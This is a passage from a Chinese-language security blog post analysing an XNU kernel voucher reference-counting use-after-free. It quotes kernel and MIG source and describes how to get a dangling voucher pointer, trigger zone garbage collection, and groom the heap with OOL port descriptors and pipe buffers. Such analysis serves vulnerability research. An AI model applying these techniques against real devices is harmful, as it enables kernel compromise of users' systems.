old_notify;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* transfer our ref to the port, and arm the no-senders notification */</span></span><br><span class="line">		assert(IP_NULL == port-&gt;ip_nsrequest);</span><br><span class="line">		ipc_port_nsrequest(port, port-&gt;ip_mscount, ipc_port_make_sonce_locked(port), &amp;old_notify);</span><br><span class="line">		<span class="comment">/* port unlocked */</span></span><br><span class="line">		assert(IP_NULL == old_notify);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* piggyback on the existing port reference, so consume ours */</span></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">		ipc_voucher_release(voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (send);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到上面的实现中，在<code>task_swap_mach_voucher</code>函数调用后，通过调用<code>ipc_voucher_release</code>函数将<code>new_voucher</code>的引用计数减1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);</span><br><span class="line">ipc_voucher_release(new_voucher);</span><br></pre></td></tr></table></figure>

<p>因此，这个过程中，引用计数的变化如下：</p>
<ol>
<li><code>new_voucher</code>的引用计数+1          &#x3D;&gt; <code>convert_port_to_voucher()</code></li>
<li><code>old_voucher</code>的引用计数+1          &#x3D;&gt; <code>convert_port_to_voucher()</code></li>
<li><code>old_voucher = new_voucher</code>      &#x3D;&gt; <code>task_swap_mach_voucher()</code></li>
<li><code>new_voucher</code>的引用计数-1           &#x3D;&gt; <code>ipc_voucher_release()</code></li>
<li><code>new_voucher</code>的引用计数-1 <code>(old_voucher = new_voucher)  =&gt;  convert_voucher_to_port</code></li>
</ol>
<p>将<code>new_voucher</code>的引用计数减少为0，从而释放该对象。并且<code>old_voucher</code>的引用计数可以增加很多。如果存储指向<code>new_voucher</code>的指针，然后使用漏洞将<code>new_voucher</code>的引用计数减少为0，这样就有可能获得指向<code>new_voucher</code>的悬空指针。</p>
<h2 id="利用voucher"><a href="#利用voucher" class="headerlink" title="利用voucher"></a>利用voucher</h2><p>现在需要找到哪里可以存储<code>ipc_voucher</code>指针，方法是直接在内核源码中搜索<code>ipc_voucher_t</code>，发现在<code>osfmk/kern/thread.h</code>的thread对象有一个成员能够持有<code>ipc_voucher</code>指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_EMBEDDED */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span>			thread_callout_interrupt_wakeups;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_callout_platform_idle_wakeups;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_timer_wakeups_bin_1;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_timer_wakeups_bin_2;</span><br><span class="line">	<span class="type">uint16_t</span>			thread_tag;</span><br><span class="line">	<span class="type">uint16_t</span>			callout_woken_from_icontext:<span class="number">1</span>,</span><br><span class="line">					callout_woken_from_platform_idle:<span class="number">1</span>,</span><br><span class="line">					callout_woke_thread:<span class="number">1</span>,</span><br><span class="line">					thread_bitfield_unused:<span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">mach_port_name_t</span>		ith_voucher_name;</span><br><span class="line">	<span class="type">ipc_voucher_t</span>			ith_voucher;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_IOSCHED</span></span><br><span class="line">	<span class="type">void</span> 				*decmp_upl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_IOSCHED */</span></span></span><br></pre></td></tr></table></figure>

<p>使用<code>thread_get_mach_voucher</code>和<code>thread_set_mach_voucher</code>函数从用户态读取和写入<code>voucher</code>引用。查看MIG为该函数生成的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine thread_get_mach_voucher */</span></span><br><span class="line">mig_internal novalue _Xthread_get_mach_voucher</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">	thr_act = convert_port_to_thread(In0P-&gt;Head.msgh_request_port);</span><br><span class="line"></span><br><span class="line">	RetCode = thread_get_mach_voucher(thr_act, In0P-&gt;which, &amp;voucher);</span><br><span class="line">	thread_deallocate(thr_act);</span><br><span class="line">	<span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</span><br><span class="line">		MIG_RETURN_ERROR(OutP, RetCode);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line">	OutP-&gt;voucher.name = (<span class="type">mach_port_t</span>)convert_voucher_to_port(voucher);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">	OutP-&gt;Head.msgh_size = (<span class="type">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</span><br><span class="line">	OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">	__AfterRcvRpc(<span class="number">3625</span>, <span class="string">&quot;thread_get_mach_voucher&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一旦获得了指向已释放<code>voucher</code>对象的悬空指针，便可以使用其他对象占用已释放的<code>voucher</code>对象。但这并不容易，<code>voucher</code>通常位于自己的<code>ipc voucher zone</code>中，如<code>osfmk/ipc/ipc_voucher.c</code>所示，其中<code>zinit</code>为<code>voucher</code>分配了一个新<code>zone</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">natural_t</span> ipc_voucher_max = (task_max + thread_max) * <span class="number">2</span>;</span><br><span class="line">	<span class="type">natural_t</span> attr_manager_max = MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN;</span><br><span class="line">	<span class="type">iv_index_t</span> i;</span><br><span class="line"></span><br><span class="line">	ipc_voucher_zone = zinit(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 ipc_voucher_max * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 <span class="string">&quot;ipc vouchers&quot;</span>);</span><br><span class="line">	zone_change(ipc_voucher_zone, Z_NOENCRYPT, TRUE);</span><br><span class="line"></span><br><span class="line">	ipc_voucher_attr_control_zone = zinit(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 attr_manager_max * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 <span class="string">&quot;ipc voucher attr controls&quot;</span>);</span><br><span class="line">	zone_change(ipc_voucher_attr_control_zone, Z_NOENCRYPT, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* initialize voucher hash */</span></span><br><span class="line">	ivht_lock_init();</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; IV_HASH_BUCKETS; i++)</span><br><span class="line">		queue_init(&amp;ivht_bucket[i]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* initialize global table locking */</span></span><br><span class="line">	ivgt_lock_init();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(MACH_VOUCHER_ATTR_KEY_USER_DATA) || defined(MACH_VOUCHER_ATTR_KEY_TEST)</span></span><br><span class="line">	user_data_attr_manager_init();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，被释放的<code>voucher</code>的内存将被放置在<code>zone</code>的<code>freelist</code>中，并在创建新<code>voucher</code>时分配给新<code>voucher</code>。为了用其他对象占用，唯一可行的方法是触发<code>zone</code>垃圾收集，它会将被释放的<code>voucher</code>的内存(最小大小为1页)移到<code>zone map</code>中，然后这些内存就可以重新分配给其他对象。可以通过分配大量<code>voucher</code>并释放它们来做到这一点。</p>
<p>回到MIG为<code>thread_get_mach_voucher</code>生成的代码。假设已经使用其他对象占据了已释放的<code>voucher</code>对象，则调用<code>thread_get_mach_voucher</code>应该成功而内核不会<code>panic</code>，这意味着该<code>voucher</code>应该具有有效的<code>iv_refs</code>成员。</p>
<p>随后，调用<code>convert_voucher_to_port</code>函数，该函数首先使用<code>assert()</code>检查<code>voucher</code>是否具有正确的引用计数。然后再使用<code>IP_VALID()</code>检查<code>voucher</code>端口的有效性。如果无效，则会分配一个新的<code>voucher</code>端口。这很有用，因为在分配伪造的<code>voucher</code>占用已释放的<code>voucher</code>时，如果以某种方式将<code>iv_port</code>指针设置为<code>NULL</code>，那么实际上还可以将新分配的<code>voucher</code>端口<code>(IKOT_VOUCHER)</code>返回到用户态<code>(ith_voucher-&gt;iv_port)</code>。这将使我们能够进一步操纵<code>voucher</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert a voucher to a port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_port_t</span></span><br><span class="line"><span class="title function_">convert_voucher_to_port</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span>	port, send;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IV_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span> (IP_NULL);</span><br><span class="line"></span><br><span class="line">	assert(os_ref_get_count(&amp;voucher-&gt;iv_refs) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a port if needed */</span></span><br><span class="line">	port = voucher-&gt;iv_port;</span><br><span class="line">	<span class="keyword">if</span> (!IP_VALID(port)) &#123;</span><br><span class="line">		port = ipc_port_alloc_kernel();</span><br><span class="line">		assert(IP_VALID(port));</span><br><span class="line">		ipc_kobject_set_atomically(port, (<span class="type">ipc_kobject_t</span>) voucher, IKOT_VOUCHER);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* If we lose the race, deallocate and pick up the other guy&#x27;s port */</span></span><br><span class="line">		<span class="keyword">if</span> (!OSCompareAndSwapPtr(IP_NULL, port, &amp;voucher-&gt;iv_port)) &#123;</span><br><span class="line">			ipc_port_dealloc_kernel(port);</span><br><span class="line">			port = voucher-&gt;iv_port;</span><br><span class="line">			assert(ip_kotype(port) == IKOT_VOUCHER);</span><br><span class="line">			assert(port-&gt;ip_kobject == (<span class="type">ipc_kobject_t</span>)voucher);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ip_lock(port);</span><br><span class="line">	assert(ip_active(port));</span><br><span class="line">	send = ipc_port_make_send_locked(port);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == port-&gt;ip_srights) &#123;</span><br><span class="line">		<span class="type">ipc_port_t</span> old_notify;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* transfer our ref to the port, and arm the no-senders notification */</span></span><br><span class="line">		assert(IP_NULL == port-&gt;ip_nsrequest);</span><br><span class="line">		ipc_port_nsrequest(port, port-&gt;ip_mscount, ipc_port_make_sonce_locked(port), &amp;old_notify);</span><br><span class="line">		<span class="comment">/* port unlocked */</span></span><br><span class="line">		assert(IP_NULL == old_notify);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* piggyback on the existing port reference, so consume ours */</span></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">		ipc_voucher_release(voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (send);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用OOL端口描述符进行堆风水"><a href="#利用OOL端口描述符进行堆风水" class="headerlink" title="利用OOL端口描述符进行堆风水"></a>利用OOL端口描述符进行堆风水</h2><p>回顾Mach复杂消息的描述符成员，其中有一个<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>消息类型。当通过<code>mach_msg</code>发送Mach消息时依次调用<code>mach_msg_send-&gt;ipc_kmsg_copyin-&gt;ipc_kmsg_copyin_body</code>，在<code>ipc_kmsg_copyin_body</code>函数中对于<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>的情况会调用<code>ipc_kmsg_copyin_ool_ports_descriptor</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_descriptor_t</span> *</span><br><span class="line"><span class="title function_">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_ool_ports_descriptor_t</span> *dsc,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_descriptor_t</span> *user_dsc,</span></span><br><span class="line"><span class="params">	<span class="type">int</span> is_64bit,</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_space_t</span> space,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_object_t</span> dest,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_kmsg_t</span> kmsg,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_option_t</span> *optionp,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_return_t</span> *mr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *data;</span><br><span class="line">    <span class="type">ipc_object_t</span> *objects;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">mach_vm_offset_t</span> addr;</span><br><span class="line">    <span class="type">mach_msg_type_name_t</span> user_disp;</span><br><span class="line">    <span class="type">mach_msg_type_name_t</span> result_disp;</span><br><span class="line">    <span class="type">mach_msg_type_number_t</span> count;</span><br><span class="line">    <span class="type">mach_msg_copy_options_t</span> copy_option;</span><br><span class="line">    <span class="type">boolean_t</span> deallocate;</span><br><span class="line">    <span class="type">mach_msg_descriptor_type_t</span> type;</span><br><span class="line">    <span class="type">vm_size_t</span> ports_length, names_length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_64bit) &#123;</span><br><span class="line">        <span class="type">mach_msg_ool_ports_descriptor64_t</span> *user_ool_dsc = (<span class="keyword">typeof</span>(user_ool_dsc))user_dsc;</span><br><span class="line"></span><br><span class="line">        addr = (<span class="type">mach_vm_offset_t</span>)user_ool_dsc-&gt;address;</span><br><span class="line">        count = user_ool_dsc-&gt;count;</span><br><span class="line">        deallocate = user_ool_dsc-&gt;deallocate;</span><br><span class="line">        copy_option = user_ool_dsc-&gt;copy;</span><br><span class="line">        user_disp = user_ool_dsc-&gt;disposition;</span><br><span class="line">        type = user_ool_dsc-&gt;type;</span><br><span class="line"></span><br><span class="line">        user_dsc = (<span class="keyword">typeof</span>(user_dsc))(user_ool_dsc+<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">mach_msg_ool_ports_descriptor32_t</span> *user_ool_dsc = (<span class="keyword">typeof</span>(user_ool_dsc))user_dsc;</span><br><span class="line"></span><br><span class="line">        addr = CAST_USER_ADDR_T(user_ool_dsc-&gt;address);</span><br><span class="line">        count = user_ool_dsc-&gt;count;</span><br><span class="line">        deallocate = user_ool_dsc-&gt;deallocate;</span><br><span class="line">        copy_option = user_ool_dsc-&gt;copy;</span><br><span class="line">        user_disp = user_ool_dsc-&gt;disposition;</span><br><span class="line">        type = user_ool_dsc-&gt;type;</span><br><span class="line"></span><br><span class="line">        user_dsc = (<span class="keyword">typeof</span>(user_dsc))(user_ool_dsc+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dsc-&gt;deallocate = deallocate;</span><br><span class="line">    dsc-&gt;copy = copy_option;</span><br><span class="line">    dsc-&gt;type = type;</span><br><span class="line">    dsc-&gt;count = count;</span><br><span class="line">    dsc-&gt;address = <span class="literal">NULL</span>;  <span class="comment">/* for now */</span></span><br><span class="line"></span><br><span class="line">    result_disp = ipc_object_copyin_type(user_disp);</span><br><span class="line">    dsc-&gt;disposition = result_disp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We always do a &#x27;physical copy&#x27;, but you have to specify something valid */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_option != MACH_MSG_PHYSICAL_COPY &amp;&amp;</span><br><span class="line">        copy_option != MACH_MSG_VIRTUAL_COPY) &#123;</span><br><span class="line">        *mr = MACH_SEND_INVALID_TYPE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* calculate length of data in bytes, rounding up */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="type">mach_port_t</span>), &amp;ports_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="type">mach_port_name_t</span>), &amp;names_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ports_length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> user_dsc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = kalloc(ports_length); <span class="comment">// 分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *mr = MACH_SEND_NO_BUFFER;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __LP64__</span></span><br><span class="line">    <span class="type">mach_port_name_t</span> *names = &amp;((<span class="type">mach_port_name_t</span> *)data)[count];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">mach_port_name_t</span> *names = ((<span class="type">mach_port_name_t</span> *)data);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copyinmap(<span class="built_in">map</span>, addr, names, names_length) != KERN_SUCCESS) &#123;</span><br><span class="line">        kfree(data, ports_length);</span><br><span class="line">        *mr = MACH_SEND_INVALID_MEMORY;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (deallocate) &#123;</span><br><span class="line">        (<span class="type">void</span>) mach_vm_deallocate(<span class="built_in">map</span>, addr, (<span class="type">mach_vm_size_t</span>)ports_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    objects = (<span class="type">ipc_object_t</span> *) data; <span class="comment">// 转ipc_object_t类型</span></span><br><span class="line">    dsc-&gt;address = data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="type">mach_port_name_t</span> name = names[i];</span><br><span class="line">        <span class="type">ipc_object_t</span> object;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!MACH_PORT_VALID(name)) &#123;</span><br><span class="line">            objects[i] = (<span class="type">ipc_object_t</span>)CAST_MACH_NAME_TO_PORT(name);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">kern_return_t</span> kr = ipc_object_copyin(space, name, user_disp, &amp;object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                object = objects[j];</span><br><span class="line">                <span class="keyword">if</span> (IPC_OBJECT_VALID(object))</span><br><span class="line">                    ipc_object_destroy(object, result_disp);</span><br><span class="line">            &#125;</span><br><span class="line">            kfree(data, ports_length);</span><br><span class="line">            dsc-&gt;address = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">if</span> ((*optionp &amp; MACH_SEND_KERNEL) == <span class="number">0</span>) &#123;</span><br><span class="line">				mach_port_guard_exception(name, <span class="number">0</span>, <span class="number">0</span>, kGUARD_EXC_SEND_INVALID_RIGHT);</span><br><span class="line">			&#125;</span><br><span class="line">            *mr = MACH_SEND_INVALID_RIGHT;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((dsc-&gt;disposition == MACH_MSG_TYPE_PORT_RECEIVE) &amp;&amp;</span><br><span class="line">                ipc_port_check_circularity(</span><br><span class="line">                    (<span class="type">ipc_port_t</span>) object,</span><br><span class="line">                    (<span class="type">ipc_port_t</span>) dest))</span><br><span class="line">            kmsg-&gt;ikm_header-&gt;msgh_bits |= MACH_MSGH_BITS_CIRCULAR;</span><br><span class="line"></span><br><span class="line">        objects[i] = object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> user_dsc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用<code>kalloc</code>分配内存，然后转换为<code>ipc_object_t</code>类型，这是一个端口指针的数组。因此可以使用<code>OOL</code>端口描述符发送大量<code>Mach</code>消息，可以使用有效指针或<code>0xFFFFFFFFFFFFFFFFFF(MACH_PORT_DEAD)</code>或<code>0x0000000000000000(MACH_PORT_NULL)</code>填充<code>kalloc zone</code>。</p>
<h2 id="管道缓冲区"><a href="#管道缓冲区" class="headerlink" title="管道缓冲区"></a>管道缓冲区</h2><p>管道是xnu中另一个用于IPC的系统调用。它创建一个 分配一对文件描述符并允许单向数据流的管道。数据流经的缓冲区称为管道缓冲区。可以从缓冲区的读取端读取写入缓冲区的写入端的数据，但是不能反过来。基本上你可以在同一地址空间中进行读写。另一个重要的事情是它占用内核虚拟地址空间，因此是在堆中分配内存的有用原语。默认情况管道缓冲区的大小设置为最大16384字节，所有管道缓冲区的大小设置为最大16MB。</p>
